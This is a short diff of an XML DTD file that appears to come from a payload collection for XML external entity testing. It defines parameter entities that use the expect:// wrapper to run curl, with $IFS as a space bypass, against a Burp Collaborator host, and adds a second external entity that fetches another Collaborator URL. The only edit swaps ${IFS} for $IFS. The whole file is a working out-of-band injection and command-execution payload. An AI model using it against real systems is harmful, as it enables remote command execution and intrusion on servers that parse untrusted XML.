@@ -1,4 +1,4 @@
-<!ENTITY % ccc SYSTEM "expect://curl${IFS}'qq.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net'">
+<!ENTITY % ccc SYSTEM "expect://curl$IFS'qq.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net'">
 %ccc;
 <!ENTITY % ddd SYSTEM "https://bbb.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net/">
 %ddd;
